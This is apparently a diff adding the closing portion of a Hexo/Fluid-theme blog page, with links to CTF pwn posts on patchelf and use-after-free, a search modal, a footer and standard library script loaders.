+                      <a href="/2022/11/27/ctf-pwn/patchelf%E4%BF%AE%E6%94%B9%E7%A8%8B%E5%BA%8Flibc%E7%89%88%E6%9C%AC/" title="patchelf修改libc版本">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">patchelf修改libc版本</span>
+                        <span class="visible-mobile">Previous</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2022/11/22/ctf-pwn/UAF/" title="UAF">
+                        <span class="hidden-mobile">UAF</span>
+                        <span class="visible-mobile">Next</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;Table of Contents</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+  
+  
+
+
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">Keyword</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="busuanzi_container_site_pv" style="display: none">
+        Views: 
+        <span id="busuanzi_value_site_pv"></span>
+        
+      </span>
+    
+    
+      <span id="busuanzi_container_site_uv" style="display: none">
+        Visitors: 
+        <span id="busuanzi_value_site_uv"></span>
+        
+      </span>
+    
+    
+  
+</div>
+
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  
+      <script>
+        if (!window.MathJax) {
+          window.MathJax = {
+            tex    : {
+              inlineMath: { '[+]': [['$', '$']] }
+            },
+            loader : {
+              load: ['ui/lazy']
+            },
+            options: {
+              renderActions: {
+                insertedScript: [200, () => {
+                  document.querySelectorAll('mjx-container').forEach(node => {
+                    let target = node.parentNode;
+                    if (target.nodeName.toLowerCase() === 'li') {
+                      target.parentNode.classList.add('has-jax');
+                    }
+                  });
+                }, '', false]
+              }
+            }
+          };
+        } else {
+          MathJax.startup.document.state(0);
+          MathJax.texReset();
+          MathJax.typeset();
+          MathJax.typesetPromise();
+        }
+
+        Fluid.events.registerRefreshCallback(function() {
+          if ('MathJax' in window && MathJax.startup.document && typeof MathJax.startup.document.state === 'function') {
+            MathJax.startup.document.state(0);
+            MathJax.texReset();
+            MathJax.typeset();
+            MathJax.typesetPromise();
+          }
+        });
+      </script>
+    
+
+  <script  src="https://lib.baomitu.com/mathjax/3.2.2/es5/tex-mml-chtml.js" ></script>
+
+  <script  src="/js/local-search.js" ></script>
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">Blog works best with JavaScript enabled</div>
+  </noscript>
+</body>
+</html>
